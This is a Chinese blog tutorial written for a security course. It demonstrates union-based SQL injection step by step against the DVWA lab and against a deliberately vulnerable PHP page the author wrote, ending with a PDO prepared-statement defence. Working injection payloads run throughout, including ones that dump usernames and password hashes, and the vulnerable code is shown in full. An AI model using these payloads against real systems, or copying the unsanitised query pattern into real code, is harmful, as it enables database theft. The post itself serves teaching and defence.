---
layout:       post  
title:        SQL Injection 从入门到不精通  
subtitle:     详细分析SQL注入，从DVWA和自己写的页面入手，还有防御方法噢  
date:         2020-12-10  
auther:       BlackDn  
header-img:   img/acg.ggy_13.jpg
catalog:      true  
tags:  
    - CTF
    - Security
---

> "你已春色摇曳，我仍一身旧雪。"

# 前言
咕咕咕  
前两天网络攻防课做了SQL注入和XSS的实验，然后写了实验报告。  
挣扎了好久也算是有点理解了，所以顺便再写写整理一下。  
这次先在DVWA的low难度上过一遍，然后自己写一个页面巩固一下ww  
# SQL Injection 从入门到不精通
SQL Injection，即SQL注入，指对用户输入数据的合法性没有判断或过滤不严，攻击者在数据传输末尾（通常是在输入框里）添加额外的非法语句从而实现非法操作  
SQL注入的分类多种多样，有根据**注入位置**分为GET注入、POST注入、Cookie注入等，也有根据**结果反馈**分为基于布尔值注入、基于时间注入等  
不过我还是喜欢最基础的分类方式，根据**参数类型**分为数字型注入和字符型注入（也有看到分为数字型、字符型、搜索型等，并不统一）  

```
1. 数字型，参数不用被引号括起来，如?id=1
2. 字符型，参数要被引号扩起来,如?name="phone"
```

具体可以查看[**参考1**](http://baijiahao.baidu.com/s?id=1653173591310148806&wfr=spider&for=pc)，或自行搜索。  

## DVWA的SQL注入（难度为low）
我在这给出在DVWA的low难度中进行注入的练习和分析，因为DVWA同时给出了源码所以比较方便  
[**参考2**](https://blog.csdn.net/weixin_45116657/article/details/100010420)给出了DVWA所有难度的SQL注入过程，很详细的，可以看看。  
  
先输入个1，可以正常查询  
![1](https://z3.ax1x.com/2021/04/13/cyVlz8.png)  

###### 1. 判断注入点是否存在及其类型
第一步是检测是否存在注入点，具体判断注入点的方法见[**参考3**](https://blog.csdn.net/slip_666/article/details/79039506)，在此我们进行如下输入  

```
输入“1'”，报错“You have an error in your SQL syntax; 
check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1”  
输入“1' or '1' = '1”，显示全部记录  
输入“1' or '1' = '2”，正常显示查询，结果只有id=1（上面那张图）  
```
![all](https://z3.ax1x.com/2021/04/13/cyV3QS.png)    

由此可以判断，这里**存在注入点**，而且是**字符型注入点**，即后台处我们输入的数据（看下面源码，即'$id'）被引号引起来了  

```
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

我们根据源码来进行分析  
源码是php代码，所以在数据库中执行的查询实际上是（去掉最外面的引号）  

```
SELECT first_name, last_name FROM users WHERE user_id = '$id';

输入“1'”：SELECT first_name, last_name FROM users WHERE user_id = '1'';
因为引号不匹配所以报错，这个时候就推测是字符型注入

输入“1 or 1=1”：SELECT first_name, last_name FROM users WHERE user_id = '1' or '1' = '1';
相当于WHERE（user_id = '1' ）or（'1' = '1'），因为'1' = '1'是永真，
所以对于所有记录WHERE的条件都永远成立，所以查询到所有记录

输入“1 or 1=2”：SELECT first_name, last_name FROM users WHERE user_id = '1 or 1=2';
同理，WHERE（user_id = '1' ）or（'1' = '2'），'1' = '2'永假，
所以只有user_id = '1'成立才成功查询
```

###### 2. 检测字段数
我们假装不知道源码，看看这条查询语句查找了多少字段（看了源码我们知道答案是两个，first_name和last_name）  

```
输入“1' order by 1#”，正常显示  
输入“1' order by 2#”，正常显示  
输入“1' order by 3#”，报错“Unknown column '3' in 'order clause'”  

注：#能将后面的语句注释掉
```

**由此可以确定只有2个字段**  
  
接着分析一波  

```
输入“1' order by 1#”：SELECT first_name, last_name FROM users WHERE user_id = '1' order by 1#';
因为#注释掉了后面的内容（其实就注释了一个引号），查询语句变为
SELECT first_name, last_name FROM users WHERE user_id = '1' order by 1
order by 可以将查询结果根据某字段排序，order by 1就说明根据第1个字段（first_name）排序，
同理，输入order by 2就根据第2个字段（last_name）排序.
而输入order by 3，因为一共只有两个字段，所以报错。
由此分析出共查询到2个字段
```
###### 3. 确定显示位置
其实就是确定我们之后注入的查询结果分别在页面的哪个地方被显示  
如果上一步发现只查询了一个字段，那么其实这一步就可以不做了，只有一个位置，还能在哪显示？  


```
输入“1' union select 1,2#”，额外显示一个结果  

ID: 1' union select 1,2#
First name: admin
Surname: admin

ID: 1' union select 1,2#
First name: 1
Surname: 2
```

**由此可以确定显示位置，1在First name，2在Surname，即前面的查询结果在First name显示，后面的在Surname显示**  
  
这里用到了**联合查询 union select**  
union select可以联合多表查询，将不同表的查询结果放在同一个结果集中，所以就要求两个查询的字段数要一样（这里是2个字段），这也是为什么要做第2步的原因。  

```
输入“1' union select 1,2#”：
SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,2#';
第一个结果就是users表中user_id = '1'的数据，第二个数据就是union select查询的结果
因为union select没有查询的表名，所以输入即结果，1和2，然后根据1和2的显示位置确定其和查询语句的对应关系
```

###### 4. 获取数据库名、版本等信息
然后可以显示数据库版本、数据库名等信息  

```
输入“1’ union select version(),database() # ”，显示：  

ID: 1' union select version(),database() # 
First name: admin
Surname: admin

ID: 1' union select version(),database() # 
First name: 8.0.17
Surname: dvwa
```

**可以看到数据库版本为8.0.17，数据库名为dvwa**  
  
这里就比较简单了，**version()**和**database()**是mysql的内置函数，可以显示当前数据库的版本和当前的数据库名。再结合union select进行显示即可  

###### 5. 获取表名
对于数据库5.0以上的版本，存在information_schema数据库，这个库保存了Mysql服务器所有数据库的信息，如数据库名，数据库的表等信息  
这是我数据库里这个表的信息（不要吐槽字体！）  

![information_schema](https://z3.ax1x.com/2021/04/13/cyVYZj.png)  

事实上，其中的**TABLES表**存着所有表的信息，**COLUMNS表**存着所有字段的信息  
通过这个数据库，我们能够可以获取现在使用的数据库的表名和字段名（理论上还可以获得所有数据库、表、字段名）  
所以上一步获取数据库的版本，就是为了判断是否存在这个表  

```
输入“1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#”，返回如下  

ID: （我输入的这一长串）
First name: admin
Surname: admin
ID: （我输入的这一长串）
First name: 1
Surname: guestbook,users
```

**可以看到数据库（dvwa）中有两个表，guestbook和user**  
  
**group_concat()**是mysql的一个指令，可以将多个结果合并成一个字段。  
上面我们查询到了**guestbook和users**两个结果，然后用这条指令将其合并，从而满足union select需要相同字段数的条件（这里是两个字段，1和group_concat(table_name)）    
  
**information_schema.tables**表示我们对**information_schema数据库**中的**tables表**进行查询，这个表中的**table_schema字段**说明该记录的表对应哪个数据库，我们用**table_schema=database()**获取所有数据库为**database()**的表  
从而得到结果：guestbook和user  

###### 6. 获取字段名
有了表名，我们就可以查看表中有哪些字段  

```
输入“1’ union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘users’#”，返回如下  

ID: （我输入的这一长串）
First name: admin
Surname: admin

ID: （我输入的这一长串）
First name: 1
Surname: avatar,failed_login,first_name,last_login,last_name,password,user,user_id
```

这里就和上面获取表名的原理大同小异了  
**information_schema.columns**表示从**information_schema数据库**的**columns表**中进行查询，并且这个表中的**table_name字段**要等于我们目标的表名users  
因为**columns表**中存放了所有数据库字段的信息，而**table_name字段**则表示该字段对应哪个表  

结果发现user表中有很多字段但最让我们眼睛一亮的是**user和password字段**  

###### 7. 获取字段内容
有了表名，有了字段名，我们就可以获取其中的内容了  

```
输入1' union select user,password from users#，结果如下

ID: 1' union select user,password from users#
First name: admin
Surname: admin

ID: 1' union select user,password from users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' union select user,password from users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 1' union select user,password from users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 1' union select user,password from users#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1' union select user,password from users#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

利用union select获取**user表**中**user和password**的信息  
根据之前确定的位置，我们可以知道，**First name**位置显示的是**user**信息，**Surname**位置显示的是**password**信息  

我们拿最后一个去解密看看，忙猜md5加密，要是猜不中就猜hash加密等，然后一个个去尝试碰撞解密  
![md5](https://z3.ax1x.com/2021/04/13/cyVGLQ.png)  
从而得到明文密码password  

## 做个小练习
然后自己写一个简单的页面进行尝试，这也是网络攻防课程的报告内容（虽然课上不会做课后恶补才做出来）  
源码和数据库内容放后面  

![self](https://z3.ax1x.com/2021/04/13/cyV8sg.png)  

###### 1. 判断注入点是否存在及其类型
先确定注入点  

```
输入“1'”，显示“没有ID为1\'的用户”
输入“1 or 1=1”，显示所有记录
输入“1 or 1=2”，显示“ID为1 or 1=2的用户名为admin”
输入“1' or '1'='2”，显示“没有ID为1\' or \'1\'=\'2的用户”
```

从而判断此处存在数字型注入点，即变量没有被引号引起来（看源码也能看见）  
要注意的是，讲道理作为数字型注入，输入“1'”是会报错的，但是我这里并没有。原因是php不区分单引号和双引号，而我的查询语句后面没东西了，所以这里输入的单引号和前面的双引号闭合，查询语句还是没有问题的  
看看源码  

```
$sql = "SELECT account FROM user WHERE id=$id";

输入“1'”：$sql = "SELECT account FROM user WHERE id=1'";
还是符合sql语法的，因此没有报错

但是如果id后面还有东西那就会报错了，比如查询语句是这样的：
$sql = "SELECT account FROM user WHERE id=$id AND password=$password";
输入“1'”：$sql = "SELECT account FROM user WHERE id=1' AND password=$password";
这样就会因为括号不匹配而报错了
```
###### 2. 判断查询字段数
```
输入“1 order by 1#”，显示“ID为1 order by 1#的用户名为admin”
输入“1 order by 2#”，显示“没有ID为1 order by 2#的用户”
```
**得知只查询了一个字段（从源码看出只查询一个account）**  

###### 3. 确定显示位置
然后判断显示位置（其实不用判断，都只有一个位置，还能在哪显示）

```
输入“1 union select 1”，显示如下  

ID为1 union select 1的用户名为admin
ID为1 union select 1的用户名为1
```

###### 4. 显示版本、数据库名等信息

```
输入“1 union select version()#”，显示如下

ID为1 union select version()#的用户名为admin
ID为1 union select version()#的用户名为5.1.28-rc-community

输入“1 union select database()#”，显示如下

ID为1 union select database()#的用户名为admin
ID为1 union select database()#的用户名为blog
```
**得知数据库软件版本为5.1.28，使用的数据库名为blog**  

###### 5. 获取表名
然后开始爆表

```
输入（为了方便看我加了换行，下同）
“1 union select group_concat(table_name) 
from information_schema.tables 
where table_schema=database()#”，显示如下

ID为（上面输入的一大串）的用户名为admin
ID为（上面输入的一大串）的用户名为user
```
**得到表名为user**  

###### 6. 获取字段名
继续爆字段  
爆字段的时候要注意一点，因为我们在查询的时候要写入表名，根据上面的经验，我们很自然会输入  

```
1 union select group_concat(column_name) 
from information_schema.columns 
where table_schema=database() and table_name='user'#
```
然后发现这样错了  
因为是**数字型注入**，我们输入的变量在后台是不带引号的，而输入却带引号，会被转义，因此我们要提前将其转义为**十六进制**，从而避免输入引号  

```
user的十六进制：0x75736572
输入：
1 union select group_concat(column_name) 
from information_schema.columns 
where table_schema=database() and table_name=0x75736572#
结果如下

ID为（上面输入的一大串）的用户名为admin

ID为（上面输入的一大串）的用户名为id,account,password
```
（这一点卡了我好久，结果发现DVWA的Medium级别的SQL注入有这点，哭了）  
发现表中有三个字段，**id，account，password**

###### 7. 获取字段内容
肯定选择查看**password字段**的内容

```
输入“1 union select password from user”，显示  

ID为1 union select password from user的用户名为admin
ID为1 union select password from user的用户名为passwo
ID为1 union select password from user的用户名为1313
ID为1 union select password from user的用户名为12345
······
```

#### 页面源码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>sql_in.php</title>
</head>
<body>
    <form action="" method="GET">
        <input name="id" type="text" value="" placeholder="输入要查询的id">
        <button>查询</button>
    </form>

    <?php
        if($_REQUEST['id'] != null){
            $id=$_GET['id'];

            $servername = "localhost";
            $username = "root";
            $password = "";
            $dbname = "blog";
            
            //创建连接
            $conn = new mysqli($servername, $username, $password, $dbname);
            if ($conn->connect_error) {
                die("连接失败: ". $conn->connect_error);
            }
        
            $conn->set_charset("utf-8");
            $conn->query("set names utf8");
        
            //查询
            $sql = "SELECT account FROM user WHERE id=$id";
            $result = $conn->query($sql);
        
            // print_r($result->num_rows);
            //echo $sql;
            if($result->num_rows == 0) {
                die("没有ID为".$id."的用户");
            }else {
                while($row=mysqli_fetch_assoc($result)) {
                    $account = $row["account"];
            
                    echo "<pre>"; 
                    echo "ID为".$id."的用户名为".$account;
                    echo "</pre><br/>";
                }
            }

        
            mysqli_free_result($result);
            $conn->close();
        }
    ?>
</body>
</html>
```

#### 数据库sql代码
数据库（建库代码挺好看的，就不截图了）  

```
-- phpMyAdmin SQL Dump
-- version 2.11.9.2
-- http://www.phpmyadmin.net
--
-- 主机: 127.0.0.1:3306
-- 生成日期: 2020 年 12 月 04 日 13:08
-- 服务器版本: 5.1.28
-- PHP 版本: 5.2.6

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

--
-- 数据库: `blog`
--
CREATE DATABASE `blog` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;
USE `blog`;

-- --------------------------------------------------------

--
-- 表的结构 `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL,
  `account` varchar(11) DEFAULT NULL,
  `password` varchar(6) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8;

--
-- 导出表中的数据 `user`
--

INSERT INTO `user` (`id`, `account`, `password`) VALUES
(1, 'admin', 'passwo'),
(21, '12', '1313'),
(8, '23333', '12345'),
(7, 'CHANG', '987'),
(6, 'GG', '666'),
(5, 'BOBO', '777'),
(4, 'YONG', '123456'),
(3, 'ming', '111'),
(2, 'me', '123'),
```

### 防御
简单的防御方法包括改用POST，或用“$id=mysqli_real_escape_string($id);”语句过滤特殊字符等。但这种防御方法可以通过抓包修改而被绕过。  
目前最广泛使用的防注入技术是PDO技术，具体使用方法可以查看[**参考4**](https://blog.51cto.com/12332766/2137035)、[**参考5**](https://blog.csdn.net/xing89119/article/details/53639907)、[**参考6**](https://www.rootop.org/pages/3501.html)、[**参考7**](https://www.cnblogs.com/zhouguowei/p/5212994.html)  
这里给出用PDO加固后的后台代码  

```
    <?php
        if($_REQUEST['id'] != null){
            $id=$_GET['id'];

            $servername = "localhost";
            $username = "root";
            $password = "";
            $dbname = "blog";
            $dsn = "mysql:host=$servername;dbname=$dbname";
            try{
                $pdo = new PDO($dsn,$username,$password);    //使用PDO技术
                $sql = "SELECT account FROM user WHERE id=:id";   //用PDO技术防止注入
    
                $result = $pdo ->prepare($sql);    //预处理语句
                $result->bindParam(':id',$id,PDO::PARAM_INT);
                $result->execute();
                echo $result->rowCount();
    
                if($result->rowCount() == 0) {
                    die("没有ID为".$id."的用户");
                }else {
                    while($row=$result->fetch(PDO::FETCH_ASSOC)) {
                        $account = $row["account"];
                
                        echo "<pre>"; 
                        echo "ID为".$id."的用户名为".$account;
                        echo "</pre><br/>";
                    }
                }
            } catch(PDOException $e){
                echo $e->getMessage();
            }
        }
    ?>
```

最后测试一下  
![防止注入](https://s3.ax1x.com/2020/12/10/riVnBj.png)  
可以看到成功防止注入  
  
PDO的本质思想是将查询语句和输入数据划分明显的界限  
先用**pepare()**方法固定查询语句的结构，然后用**占位符替换**的方式放入输入的数据，从而不管输入什么，后台始终将其看作数据而非查询语句，以此防御注入语句。  
## 总结
1. 判断注入点是否存在及其类型
2. 判断查询字段数（order by）
3. 确定显示位置(union select)
4. 显示版本、数据库名等信息（union select）
5. 获取表名
6. 获取字段名
7. 获取字段内容

## 参考
1. [SQL注入介绍及分类解读](http://baijiahao.baidu.com/s?id=1653173591310148806&wfr=spider&for=pc)  
2. [Kali渗透测试之DVWA系列（三）——SQL Injection（SQL注入）](https://blog.csdn.net/weixin_45116657/article/details/100010420)  
3. [SQL注入-注入点判断](https://blog.csdn.net/slip_666/article/details/79039506)  
4. [记录一下学习PDO技术防范SQL注入的方法](https://blog.51cto.com/12332766/2137035)
5. [PHP PDO使用prepare()方法和execute()方法执行SQL语句](https://blog.csdn.net/xing89119/article/details/53639907)
6. [PHP PDO prepare()、execute()方法详解](https://www.rootop.org/pages/3501.html)
7. [PHP PDO prepare()、execute()和bindParam()方法详解](https://www.cnblogs.com/zhouguowei/p/5212994.html)
